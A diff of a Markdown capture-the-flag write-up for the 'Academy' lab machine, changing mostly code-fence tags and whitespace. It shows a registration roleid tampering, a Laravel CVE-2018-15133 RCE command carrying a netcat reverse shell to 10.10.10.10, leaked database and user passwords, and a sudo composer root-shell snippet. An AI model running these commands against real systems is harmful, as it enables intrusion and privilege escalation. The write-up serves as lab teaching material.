@@ -50,9 +50,9 @@ Checking this service from `nmap` scan, noticed that the page contains a redirec
 
 ![image-20210217115623157](https://i.imgur.com/jPgHc5K.png){: .align-center}
 
-As the page source did not disclosed nothing, proceeded by creating a dummy account (`dummy:P@ssword`) to get initial access to the platform but noticed something interesting in the post request, where a hidden field from the register form was sending a parameter **roleid**, set to value **0**. 
+As the page source did not disclosed nothing, proceeded by creating a dummy account (`dummy:P@ssword`) to get initial access to the platform but noticed something interesting in the post request, where a hidden field from the register form was sending a parameter **roleid**, set to value **0**.
 
-```
+```bash
 POST /register.php HTTP/1.1
 Host: academy.htb
 Content-Length: 57
@@ -73,7 +73,7 @@ uid=dummy&password=P%40ssw0rd&confirm=P%40ssw0rd&roleid=0
 
 Let us proceed with the default value for now but we already have an idea of what could be tampered if necessary.
 
-After entering the recently created credentials, noticed that the user could see the academy catalog, with some pre-loaded credit but no operation (unlock) was possible once the unlock API (http://academy.htb/api/modules/unlock) was not available, returning a HTTP 404 error.
+After entering the recently created credentials, noticed that the user could see the academy catalog, with some pre-loaded credit but no operation (unlock) was possible once the unlock API (`http://academy.htb/api/modules/unlock`) was not available, returning a HTTP 404 error.
 
 ![image-20210217130138100](https://i.imgur.com/ZWqyaUH.png){: .align-center}
 
@@ -81,7 +81,7 @@ After entering the recently created credentials, noticed that the user could see
 
 Once we came into a dead end, let us see if we can brute force any path on this box that might led us to a possible initial foothold. Running `gobuster` gave us 2 interesting pages to investigate further: **admin.php** and **config.php**.
 
-```
+```bash
 gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://academy.htb -t 50 -o gobuster_80.txt -x php,html,txt
 ===============================================================
 Gobuster v3.0.1
@@ -115,7 +115,7 @@ Accessing `admin.php` noticed that this pace looks very similar to the previous 
 
 ![image-20210217131705459](https://i.imgur.com/s54Fy4z.png){: .align-center}
 
-Besides not existing any information hidden in the source code of this page, what called attention was the host **dev-staging-01.academy.htb** which might also be running in this box. 
+Besides not existing any information hidden in the source code of this page, what called attention was the host **dev-staging-01.academy.htb** which might also be running in this box.
 
 After adding it to the hosts file under the same IP, the page below was shown, which is an error handler framework for PHP, which allows developers to debug code in their code, but in this case was open and leaking lots of information such as credentials and environment variables.
 
@@ -124,19 +124,20 @@ After adding it to the hosts file under the same IP, the page below was shown, w
 What most called attention in the information leaked was the MySQL credentials and Laravel App_key, which might lead us to an initial foothold in this box.
 
 ## Initial Foothold
+
 As we don't have MySQL 3306/TCP open in this box, based on the initial nmap scan, searching a little about what could be done by using the Laravel App_key I came across the [CVE-2018-15133](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15133) which can lead to RCE through an unserialized call in some affected Laravel versions. If we were lucky this might work for this box :smiley:.
 
 Doing some search, I have found [this repository](https://github.com/aljavier/exploit_laravel_cve-2018-15133) which implements this exploit in a simple manner, which was the one I have used to get an initial foothold in the box.
 
-```
-$ python3 ./pwn_laravel.py http://dev-staging-01.academy.htb dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0= -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4443 >/tmp/f"
+```bash
+python3 ./pwn_laravel.py http://dev-staging-01.academy.htb dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0= -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4443 >/tmp/f"
 ```
 
 ## User flag
 
 After upgrading the reverse shell, first thing to check was the content of the previously enumerated file **config.php**, listed below:
 
-```
+```bash
 www-data@academy:/var/www/html$ cat ./academy/public/config.php 
 <?php
 ini_set('display_errors', 1);
@@ -148,7 +149,7 @@ $link=mysqli_connect('localhost','root','GkEWXn4h34g8qx9fZ1','academy');
 
 Connecting to local instance of MySQL using the obtained credentials, noticed that there were some users created and their password hashes, that could possibly be reused by one of the existing users of this box.
 
-```
+```bash
 $ mysql -u root -p
 Password:
 
@@ -179,24 +180,23 @@ After some research, found that these passwords were hashed using MD5 prior to s
 
 Now that we have a few passwords, we need to check which user possibly has the user flag. By running the command below, we have identified user **cry0l1t3** as the one we should test the obtained passwords so far:
 
-```
+```bash
 www-data@academy:/home$ find /home -type f 2>/dev/null | grep user.txt
 /home/cry0l1t3/user.txt
 ```
 
 At the first try, using `mySup3rP4s5w0rd!!` we were able to login as cry0l1t3 and get the user flag
 
-```
+```bash
 cry0l1t3@academy:~$ cat user.txt 
 <redacted>
 ```
 
 ## Root flag
-### Enumeration
 
 Now running as cry0l1t3, we can enumerate further this box. The first thing to do is to check his permissions. The user `cry0l1t3` cannot run anything as root, based on `sudo -l` execution but he is member of **adm** group, which allow us to read contents from `/var/log` which might leak some information.
 
-```
+```bash
 cry0l1t3@academy:~$ sudo -l
 [sudo] password for cry0l1t3: 
 Sorry, user cry0l1t3 may not run sudo on academy.
@@ -206,7 +206,7 @@ uid=1002(cry0l1t3) gid=1002(cry0l1t3) groups=1002(cry0l1t3),4(adm)
 
 Always when inspecting the logs from a CTF box, is important to consider its creation time, so all the other player registry entries can be ignored from the inspection. An easier way is to use the command below, which filters only files older than X days, in my case 100 which is the period of days since this box was released in the moment I am solving it.
 
-```
+```bash
 find /var/log -mtime +100 -print 2>/dev/null
 ```
 
@@ -214,7 +214,7 @@ Checking first the apache logs, nothing interesting was found by inspecting the 
 
 Checking the audit logs, we can see 2 files matching the mentioned period, which will later be inspected.
 
-```
+```bash
 cry0l1t3@academy:~$ find . -mtime +100 -print 2>/dev/null | grep audit
 /var/log/audit/audit.log.2
 /var/log/audit/audit.log.3
@@ -222,7 +222,7 @@ cry0l1t3@academy:~$ find . -mtime +100 -print 2>/dev/null | grep audit
 
 Looking for interesting commands on then (`sudo`, `su`, `passwd`) that could possibly leak some information, I was lucky to find one occurrence of **su**:
 
-```
+```bash
 cry0l1t3@academy:~$ cat /var/log/audit/audit.log.[2-3] | grep '"su"'
 type=TTY msg=audit(1597199293.906:84): tty pid=2520 uid=1002 auid=0 ses=1 major=4 minor=1 comm="su" data=6D7262336E5F41634064336D79210A
 ```
@@ -232,7 +232,7 @@ The data field contains the HEX value of the parameter used in the execution, wh
 - Open a file in edit mode using `vim`
 
   ```bash
-  $ vim /tmp/test
+  vim /tmp/test
   ```
 
 - Type `Esc` to enter em command mode and enter command `:% !xxd`. This will convert the existing content into HEX
@@ -243,7 +243,7 @@ The data field contains the HEX value of the parameter used in the execution, wh
 
 - You can later save and exit by entering the command `:wq!`  but you might have also seen the actual content of this HEX value. Below is the output of the file I've created to do this conversion:
 
-  ```
+  ```bash
   cat /tmp/test                    
   mrb3n_Ac@d3my!
   ```
@@ -252,7 +252,7 @@ As **mrb3n** is one of the other users of this box this could probably be his pa
 
 Enumerating his permissions, noticed that he's not member of any special group but has `sudo` privileges to run **composer**
 
-```
+```bash
 mrb3n@academy:~$ id
 uid=1001(mrb3n) gid=1001(mrb3n) groups=1001(mrb3n)
 mrb3n@academy:~$ sudo -l
@@ -268,7 +268,7 @@ User mrb3n may run the following commands on academy:
 
 Checking on [GTFOBins](https://gtfobins.github.io/gtfobins/composer/) is possible to escalate privileges by using composer running the snippet below, which worked without issues:
 
-```
+```bash
 TF=$(mktemp -d)
 echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
 sudo composer --working-dir=$TF run-script x
@@ -276,7 +276,7 @@ sudo composer --working-dir=$TF run-script x
 
 As **root**, finally obtained the flag under `/root/root.txt`
 
-```
+```bash
 root@academy:~# id
 uid=0(root) gid=0(root) groups=0(root)
 root@academy:~# cat root.txt 
